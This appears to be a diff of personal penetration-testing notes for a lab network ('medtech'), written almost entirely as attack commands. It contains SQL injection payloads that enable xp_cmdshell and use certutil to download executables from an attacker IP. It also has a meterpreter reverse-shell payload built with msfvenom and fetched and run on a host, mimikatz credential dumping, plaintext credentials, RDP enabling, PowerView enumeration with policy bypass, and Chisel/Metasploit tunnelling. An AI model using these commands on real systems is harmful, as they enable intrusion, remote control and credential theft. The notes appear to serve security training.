@@ -63,7 +63,7 @@ UsernameTextBox=1';EXECUTE sp_configure 'show advanced options', 1;--
 UsernameTextBox=1';RECONFIGURE;--
 UsernameTextBox=1';EXECUTE sp_configure 'xp_cmdshell', 1;--
 UsernameTextBox=1';RECONFIGURE;--
-admin=1';EXEC xp_cmdshell "certutil.exe -urlcache -f http://192.168.45.206:8088/Windows/nc.exe C:/Temp/nc.exe";--
+admin=1';EXEC xp_cmdshell "certutil.exe -urlcache -f http://192.168.45.210:8088/cute.exe C:/Temp/cute.exe";--
 ...
 192.168.215.121 - - [28/May/2024 08:05:44] "GET /Windows/nc.exe HTTP/1.1" 200 -
 ...
@@ -134,15 +134,30 @@ mimikatz # sekurlsa::logonpasswords
 PS C:\Users\Administrator\Desktop> type proof.txt
 a21cde38548900a820e8aeb8f25295f0
 
+# Lets enable WEB02 for RDP
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+xfreerdp /cert-ignore /u:joe /p:Flowers1 /v:192.168.233.121 /d:medtech.com +clipboard +drive:/home/kali/Desktop,/smb
+
+# Extract Domain information using the PowerView.ps1
+iwr -uri http://192.168.45.221:8088/Windows/PowerView.ps1 -Outfile PowerView.ps1
+powershell -ep bypass
+Import-Module .\PowerView.ps1
+Get-NetUser -Domain medtech.com 
+Get-NetComputer -Properties samaccountname, samaccounttype, operatingsystem
+Get-NetGroup -Domain medtech.com| select name
+Get-DomainGroupMember "Domain Admins" -Recurse
+
+
 # Now we owned the joe:Flowers1 credentials, we can try the crackmapexec to find out what joe can access
 
 # Before that lets establish the connection with WEB02 and dynamic port forward from WEB02 and allow KALI route to MEDTECH internal network
 
+[Metasploit Dynamic Port Forwarding]
+=====================================================
 # Lets create a MSFpayload first
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.206 LPORT=8888 -f exe -o web02-cute.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.206 LPORT=8888 -f exe -o cute.exe
 
-
-# Chisel Tunneling
+# Metasploit Dynamic Port Forwarding
 https://github.com/twelvesec/port-forwarding?tab=readme-ov-file#SSH-Remote-Port-Forwarding
 msfconsole
 msf6 > use multi/handler
@@ -152,7 +167,7 @@ set LPORT 8888
 set ExitonSession False
 
 # WEB02
-PS C:\TEMP> iwr -uri http://192.168.45.206:8088/web02-cute.exe -Outfile cute.exe
+PS C:\TEMP> iwr -uri http://192.168.45.206:8088/cute.exe -Outfile cute.exe
 PS C:\TEMP> .\cute.exe
 
 # KALI
@@ -176,10 +191,22 @@ sudo nano /etc/proxychains4.conf
 ...
 socks5 127.0.0.1 1081
 ...
+=====================================================
+
+[Chisel Dynamic Port Forwarding]
+https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
+
+./chisel server -p 8889 --reverseb --socks5
+chisel client 192.168.45.221:8889 R:socks
+# Open new shell
+sudo nano /etc/proxychains4.conf
+...
+socks5 127.0.0.1 1080
+...
 
 # Lets try to access MEDTECH internal network
-proxychains nmap -sT -Pn 172.16.237.10-14
-proxychains nmap -sT -Pn 172.16.237.82-83
+proxychains -q nmap -sT -Pn 172.16.237.10-14
+proxychains -q nmap -sT -Pn 172.16.237.82-83
 code targets.txt
 
 # Crackmapexec 
